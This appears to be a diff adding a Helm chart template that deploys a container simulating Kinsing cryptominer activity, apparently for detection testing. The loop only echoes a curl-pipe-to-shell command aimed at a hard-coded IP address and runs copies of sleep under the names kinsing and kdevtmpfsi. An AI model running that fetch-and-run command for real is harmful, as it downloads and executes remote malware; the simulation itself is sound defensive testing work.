@@ -1,0 +1,53 @@
+{{- if .Values.kinsing.enabled -}}
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: {{ include "malicious-containers.fullname" . }}-kinsing
+  labels:
+    {{- include "malicious-containers.labels" . | nindent 4 }}
+    app.kubernetes.io/component: kinsing
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      {{- include "malicious-containers.selectorLabels" . | nindent 6 }}
+      app.kubernetes.io/component: kinsing
+  template:
+    metadata:
+      labels:
+        {{- include "malicious-containers.selectorLabels" . | nindent 8 }}
+        app.kubernetes.io/component: kinsing
+    spec:
+      {{- with .Values.nodeSelector }}
+      nodeSelector:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+      containers:
+        - name: kinsing
+          image: {{ .Values.kinsing.image }}
+          {{- if .Values.kinsing.commandOverride }}
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              echo "Starting Kinsing simulation..."
+              # Mimic kinsing behavior: download a script, then a binary, then run it.
+              while true; do
+                echo "[$(date)] curl http://195.3.146.118/kinsing.sh | sh"
+                # Create a fake binary
+                cp /bin/sleep /tmp/kinsing
+                chmod +x /tmp/kinsing
+                echo "[$(date)] Running /tmp/kinsing..."
+                /tmp/kinsing 30 &
+                
+                sleep 5
+                
+                echo "[$(date)] Starting cryptominer /tmp/kdevtmpfsi..."
+                cp /bin/sleep /tmp/kdevtmpfsi
+                chmod +x /tmp/kdevtmpfsi
+                /tmp/kdevtmpfsi 20 &
+                
+                wait
+                sleep 60
+              done
+          {{- end }}
+{{- end }}
